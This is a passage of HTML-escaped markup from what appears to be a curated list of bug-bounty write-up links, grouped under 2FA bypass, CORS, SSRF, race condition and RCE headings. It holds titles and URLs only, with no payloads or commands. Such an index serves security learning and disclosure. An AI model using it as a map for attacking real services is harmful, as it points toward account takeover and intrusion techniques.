website&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ultranoob/weird-and-simple-2fa-bypass-without-any-test-b869e09ac261&#34;&gt;Weird and simple 2FA bypass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/clouddevops/bugbounty-how-i-cracked-2fa-two-factor-authentication-with-simple-factor-brute-force-a1c0f3a2f1b4&#34;&gt;How I cracked 2FA with simple factor bruteforce&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bugbountypoc.com/instagram-account-is-reactivated-without-entering-2fa/&#34;&gt;Instagram account is reactivated without entering 2FA&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@YumiSec/how-to-bypass-a-2fa-with-a-http-header-ce82f7927893&#34;&gt;How to bypass 2FA with a HTTP header&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@goyalvartul/how-i-hacked-40-000-user-accounts-of-microsoft-using-2fa-bypass-outlook-live-com-13258785ec2f&#34;&gt;How I hacked 40k user accounts of microsoft using 2FA bypass outlook&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@lukeberner/how-i-abused-2fa-to-maintain-persistence-after-a-password-change-google-microsoft-instagram-7e3f455b71a1&#34;&gt;How I abused 2FA to maintain persistence after password recovery change google microsoft instragram&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/japzdivino/bypass-hackerone-2fa-requirement-and-reporter-blacklist-46d7959f1ee5&#34;&gt;Bypass hackerone 2FA &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@zk34911/facebook-bug-bounty-how-i-was-able-to-enumerate-instagram-accounts-who-had-enabled-2fa-two-step-fddba9e9741c&#34;&gt;Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;CORS related issues&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@jayateerthag/cors-bug-on-googles-404-page-rewarded-2163d58d3c8b&#34;&gt;CORS bug on google&#39;s 404 page (rewarded)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@sasaxxx777/cors-misconfiguration-leading-to-private-information-disclosure-3034cfcb4b93&#34;&gt;CORS misconfiguration leading to private information disclosure&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@mashoud1122/cors-misconfiguration-account-takeover-out-of-scope-to-grab-items-in-scope-66d9d18c7a46&#34;&gt;CORS misconfiguration account takeover out of scope to grab items in scope&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.bi.tk/chrome-cors/&#34;&gt;Chrome CORS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@saadahmedx/bypassing-cors-13e46987a45b&#34;&gt;Bypassing CORS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@osamaavvan/cors-to-csrf-attack-c33a595d441&#34;&gt;CORS to CSRF attack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://smaranchand.com.np/2019/05/an-unexploited-cors-misconfiguration-reflecting-further-issues/&#34;&gt;An unexploited CORS misconfiguration reflecting further issues&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@sandh0t/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397&#34;&gt;Think outside the scope advanced cors exploitation techniques&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@nahoragg/a-simple-cors-misconfig-leaked-private-post-of-twitter-facebook-instagram-5f1a634feb9d&#34;&gt;A simple CORS misconfiguration leaked private post of twitter facebook instagram&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bugbaba.blogspot.com/2018/02/exploiting-cors-miss-configuration.html&#34;&gt;Explpoiting CORS misconfiguration&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@saamux/full-account-takeover-through-cors-with-connection-sockets-179133384815&#34;&gt;Full account takeover through CORS with connection sockets&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net&#34;&gt;Exploiting insecure CORS API api.artsy.net&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/pre-domain-wildcard-cors-exploitation-2d6ac1d4bd30&#34;&gt;Pre domain wildcard CORS exploitation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@arbazhussain/exploiting-misconfigured-cors-on-popular-btc-site-2aedfff906f6&#34;&gt;Exploiting misconfigured CORS on popular BTC site&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/&#34;&gt;Abusing CORS for an XSS on flickr&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Server Side Request Forgery (SSRF)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/a-bugz-life/exploiting-an-ssrf-trials-and-tribulations-14c5d8dbd69a&#34;&gt;Exploiting an SSRF trials and tribulations&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@michan001/ssrf-on-pdf-generator-36b81e16d67b&#34;&gt;SSRF on PDF generator&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ngailong.wordpress.com/2019/12/19/google-vrp-ssrf-in-google-cloud-platform-stackdriver/&#34;&gt;Google VRP SSRF in Google cloud platform stackdriver&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437&#34;&gt;Vimeo upload function SSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@pflash0x0punk/ssrf-via-ffmpeg-hls-processing-a04e0288a8c5&#34;&gt;SSRF via ffmeg processing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://geleta.eu/2019/my-first-ssrf-using-dns-rebinfing/&#34;&gt;My first SSRF using DNS rebinding&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://jin0ne.blogspot.com/2019/11/bugbounty-simple-ssrf.html&#34;&gt;Bugbounty simple SSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.openbugbounty.org/blog/leonmugen/ssrf-reading-local-files-from-downnotifier-server/&#34;&gt;SSRF reading local files from downnotifier server&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://evanricafort.blogspot.com/2019/08/ssrf-vulnerability-in.html&#34;&gt;SSRF vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@androgaming1912/gain-adfly-smtp-access-with-ssrf-via-gopher-protocol-26a26d0ec2cb&#34;&gt;Gain adfly SMTP access with SSRF via gopher protocol&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@0ktavandi/blind-ssrf-in-stripe-com-due-to-sentry-misconfiguration-60ebb6a40b5&#34;&gt;Blind SSRF in stripe.com due to senntry misconfiguration&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@w_hat_boy/server-side-request-forgery-ssrf-port-issue-hidden-approch-f4e67bd8cc86&#34;&gt;SSRF port issue hidden approch&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@logicbomb_1/the-journey-of-web-cache-firewall-bypass-to-ssrf-to-aws-credentials-compromise-b250fb40af82&#34;&gt;The jorney of web cache firewall bypass to SSRF to AWS credentials compromise&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@pratiky054/ssrf-to-read-local-files-and-abusing-the-aws-metadata-8621a4bf382&#34;&gt;SSRF to local file read and abusing aws metadata&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129&#34;&gt;pdfreactor SSRF to root level local files read which lead to RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@elberandre/ssrf-trick-ssrf-xspa-in-microsofts-bing-webmaster-central-8015b5d487fb&#34;&gt;SSRF trick : SSRF XSPA in micosoft&#39;s bing webwaster&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://m-q-t.github.io/notes/downnotifer-ssrf/&#34;&gt;Downnotifeer SSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/cesppa/escalating-ssrf-to-rce-f28c482eb8b9&#34;&gt;Escalating SSRF to RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@rootxharsh_90844/vimeo-ssrf-with-code-execution-potential-68c774ba7c1e&#34;&gt;Vimeo SSRF with code execution potential&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@elberandre/1-000-ssrf-in-slack-7737935d3884&#34;&gt;SSRF in slack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@zain.sabahat/exploiting-ssrf-like-a-boss-c090dc63d326&#34;&gt;Exploiting SSRF like a boss&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://10degres.net/aws-takeover-ssrf-javascript/&#34;&gt;AWS takeover SSRF javascript&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&#34;&gt;Into the borg of SSRF inside google production network&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@tungpun/from-ssrf-to-local-file-disclosure-58962cdc589f&#34;&gt;SSRF to local file disclosure&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@th3g3nt3l/how-i-found-an-ssrf-in-yahoo-guesthouse-recon-wins-8722672e41d4&#34;&gt;How I found an SSRF in yahoo guesthouse (recon wins)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb&#34;&gt;Reading internal files using SSRF vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://buer.haus/2017/03/09/airbnb-chaining-third-party-open-redirect-into-server-side-request-forgery-ssrf-via-liveperson-chat/&#34;&gt;Airbnb chaining third party open redirect into SSRF via liveperson chat&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Race Condition&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@vincenz/exploiting-a-race-condition-vulnerability-3f2cb387a72&#34;&gt;Exploiting a Race condition vulnerabililty&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3&#34;&gt;Race condition that could result to RCE a story with an app&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@04sabsas/bugbounty-writeup-creative-thinking-is-our-everything-race-condition-business-logic-error-2f3e82b9aa17&#34;&gt;Creating thinking is our everything : Race condition and business logic&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ciph3r7r0ll/chaining-improper-authorization-to-race-condition-to-harvest-credit-card-details-a-bug-bounty-effe6e0f5076&#34;&gt;Chaining improper authorization to Race condition to harvest credit card details&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.seekurity.com/blog/general/the-fuzz-the-bug-the-action-a-race-condition-bug-in-facebook-chat-groups-leads-to-spy-on-conversations/&#34;&gt;A Race condition bug in Facebook chat groups&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@arbazhussain/race-condition-bypassing-team-limit-b162e777ca3b&#34;&gt;Race condition bypassing team limit&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.josipfranjkovic.com/blog/race-conditions-on-web&#34;&gt;Race condition on web&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://josipfranjkovic.blogspot.com/2015/04/race-conditions-on-facebook.html&#34;&gt;Race condition bugs on Facebook&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/swlh/hacking-banks-with-race-conditions-2f8d55b45a4b&#34;&gt;Hacking Banks With Race Conditions&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e&#34;&gt;Race Condition Bug In Web App: A Use Case&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43&#34;&gt;RACE Condition vulnerability found in bug-bounty program&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@valeriyshevchenko/how-to-check-race-conditions-in-web-applications-338f73937992&#34;&gt;How to check Race Conditions in Web Applications&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Remote Code Execution (RCE)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2020/03/31/microsoft-rce-bugbounty/&#34;&gt;Microsoft RCE bugbounty&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ranjitsinghnit/otp-bruteforce-account-takeover-faaac3d712a8&#34;&gt;OTP bruteforce account takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/&#34;&gt;Attacking helpdesk RCE chain on deskpro with bitdefender&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@asdqwedev/remote-image-upload-leads-to-rce-inject-malicious-code-to-php-gd-image-90e1e8b2aada&#34;&gt;Remote image upload leads to RCE inject malicious code&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@sw33tlie/finding-a-p1-in-one-minute-with-shodan-io-rce-735e08123f52&#34;&gt;Finding a p1 in one minute with shodan.io RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/from-recon-to-optimizing-rce-results-simple-story-with-one-of-the-biggest-ict-company-in-the-ea710bca487a&#34;&gt;From recon to optimizing RCE results simple story with one of the biggest ICT company&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@mohdaltaf163/uploading-backdoor-for-fun-and-profit-rce-db-cred-p1-2cdaa00e2125&#34;&gt;Uploading backdoor for fun and profit RCE DB creds P1&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://jatindhankhar.in/blog/responsible-disclosure-breaking-out-of-a-sandboxed-editor-to-perform-rce/&#34;&gt;Responsible Disclosure breaking out of a sandboxed editor to perform RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.ripstech.com/2018/wordpress-design-flaw-leads-to-woocommerce-rce/&#34;&gt;Wordpress design flaw leads to woocommerce RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.harshjaiswal.com/path-traversal-while-uploading-results-in-rce&#34;&gt;Path traversal while uploading results in RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2018/09/07/rce-jenkins-instance-dosomething-org-bug-bounty-poc/&#34;&gt;RCE jenkins instance&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hawkinsecurity.com/2018/08/27/traversing-the-path-to-rce/&#34;&gt;Traversing the path to RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&#34;&gt;How I chained 4 bugs features into RCE on amazon&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sites.google.com/view/harshjaiswalblog/rce-due-to-showexceptions&#34;&gt;RCE due to showexceptions&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sites.google.com/securifyinc.com/secblogs/yahoo-luminate-rce&#34;&gt;Yahoo luminate RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a&#34;&gt;Latex to RCE private bug bounty program&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@emenalf/how-i-got-hall-of-fame-in-two-fortune-500-companies-an-rce-story-9c89cead81ff&#34;&gt;How I got hall of fame in two fortune 500 companies an RCE story&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/&#34;&gt;RCE by uploading a web config&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sites.google.com/site/testsitehacking/-36k-google-app-engine-rce&#34;&gt;36k Google app engine RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@kedrisec/how-i-found-2-9-rce-at-yahoo-bug-bounty-program-20ab50dbfac7&#34;&gt;How I found 2.9 RCE at yahoo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@logicbomb_1/bugbounty-how-i-was-able-to-bypass-firewall-to-get-rce-and-then-went-from-server-shell-to-get-783f71131b94&#34;&gt;Bypass firewall to get RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2018/01/rce-vulnerabilite-in-yahoo-subdomain.html&#34;&gt;RCE vulnerabilite in yahoo subdomain&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://wwws.nightwatchcybersecurity.com/2018/01/04/rce-in-duolingos-tinycards-app-for-android-cve-2017-16905/&#34;&gt;RCE in duolingos tinycards app from android&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2017/12/19/unrestricted-file-upload-to-rce-bug-bounty-poc/&#34;&gt;Unrestricted file upload to RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@uranium238/getting-a-rce-ctf-way-2fd612fb643f&#34;&gt;Getting a RCE (CTF WAY)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.zsec.uk/rce-starwars/&#34;&gt;RCE starwars&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/how-i-got-5500-from-yahoo-for-rce-92fffb7145e6&#34;&gt;How I got 5500 from yahoo for RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://whitehatnepal.tumblr.com/post/149933960267/rce-in-addthis&#34;&gt;RCE in Addthis&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://artsploit.blogspot.com/2016/01/paypal-rce.html&#34;&gt;Paypal RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@abhishake100/my-first-rce-stressed-employee-gets-me-2x-bounty-c4879c277e37&#34;&gt;My First RCE (Stressed Employee gets me 2x bounty)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://strynx.org/imagemagick-rce/&#34;&gt;Abusing ImageMagick to obtain RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@nanda_kumar/bugbounty-how-snapdeal-indias-popular-e-commerce-website-kept-their-user-data-at-risk-3d02b4092d9c&#34;&gt;How Snapdeal Kept their Users Data at Risk!&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://rezo.blog/hacking/2019/11/29/rce-via-imagetragick.html&#34;&gt;RCE via ImageTragick&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/clouddevops/bugbounty-how-i-cracked-2fa-two-factor-authentication-with-simple-factor-brute-force-a1c0f3a2f1b4&#34;&gt;How I Cracked 2FA with Simple Factor Brute-force!&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@smilehackerofficial/how-i-found-rce-but-got-duplicated-ea7b8b010990&#34;&gt;Found RCE but got Duplicated&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.usejournal.com/how-recon-helped-samsung-protect-their-production-repositories-of-samsungtv-ecommerce-estores-4c51d6ec4fdd&#34;&gt;“Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rahulr.in/2019/10/idor-to-rce.html?m=1&#34;&gt;IDOR to RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@byq/how-to-get-rce-on-aem-instance-without-java-knowledge-a995ceab0a83&#34;&gt;RCE on AEM instance without JAVA knowledge&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870&#34;&gt;RCE with Flask Jinja tempelate Injection&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3&#34;&gt;Race Condition that could result to RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rcesecurity.com/2019/09/H1-4420-From-Quiz-to-Admin-Chaining-Two-0-Days-to-Compromise-an-Uber-Wordpress/&#34;&gt;Chaining Two 0-Days to Compromise An Uber Wordpress&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@karthiksoft007/oculus-identity-verification-bypass-through-brute-force-dbd0c0d3c37e&#34;&gt;Oculus Identity Verification bypass through Brute Force&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://omespino.com/write-up-private-bug-bounty-usd-rce-as-root-on-marathon-instance/&#34;&gt;Used RCE as Root on marathon Instance&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@valeriyshevchenko/two-easy-rce-in-atlassian-products-e8480eacdc7f&#34;&gt;Two easy RCE in Atlassian Products&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://rhys.io/post/rce-in-ruby-using-mustache-templates&#34;&gt;RCE in Ruby using mustache templates&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rcesecurity.com/2019/06/about-a-sucuri-rce-and-how-not-to-handle-bug-bounty-reports/&#34;&gt;About a Sucuri RCE…and How Not to Handle Bug Bounty Reports&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@mohamedrserwah/source-code-disclose-vulnerability-b9e49584e2d2&#34;&gt;Source code disclosure vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@dortz/how-did-i-bypass-a-custom-brute-force-protection-and-why-that-solution-is-not-a-good-idea-4bec705004f9&#34;&gt;Bypassing custom Token Authentication in a Mobile App&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.7elements.co.uk/resources/blog/facebooks-burglary-shopping-list/&#34;&gt;Facebook’s Burglary Shopping List&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129&#34;&gt;From SSRF To RCE in PDFReacter&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2019/04/apache-strust-rce.html&#34;&gt;Apache strust RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/&#34;&gt;Dell KACE K1000 Remote Code Execution&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html&#34;&gt;Handlebars Tempelate Injection and RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@jonathanbouman/leaked-salesforce-api-access-token-at-ikea-com-132eea3844e0&#34;&gt;Leaked Salesforce API access token at IKEA.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.assetnote.io/bug-bounty/2019/03/19/rce-on-mozilla-zero-day-webpagetest/&#34;&gt;Zero Day RCE on Mozilla&#39;s AWS Network&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/cesppa/escalating-ssrf-to-rce-f28c482eb8b9&#34;&gt;Escalating SSRF to RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@addictrao20/fixed-brute-force-instagram-accounts-passwords-938471b6e9d4&#34;&gt;Fixed : Brute-force Instagram account’s passwords&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@spazzyy/bug-bounty-101-always-check-the-source-code-1adaf3f59567&#34;&gt;Bug Bounty 101 — Always Check The Source Code&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mustafakemalcan.com/asus-rce-vulnerability-on-rma-asus-europe-eu/&#34;&gt;ASUS RCE vulnerability on rma.asus-europe.eu&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/&#34;&gt;Magento – RCE &amp;amp; Local File Read with low privilege admin rights&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@sampanna/rce-in-nokia-com-59b308e4e882&#34;&gt;RCE in Nokia.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/&#34;&gt;Two RCE in SharePoint&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/token-brute-force-to-account-take-over-to-privilege-escalation-to-organization-take-over-650d14c7ce7f&#34;&gt;Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html&#34;&gt;RCE in Hubspot with EL injection in HubL&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pwning.re/2018/12/04/github-desktop-rce/&#34;&gt;Github Desktop RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://slashcrypto.org/2018/11/28/eBay-source-code-leak/&#34;&gt;eBay Source Code leak&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a 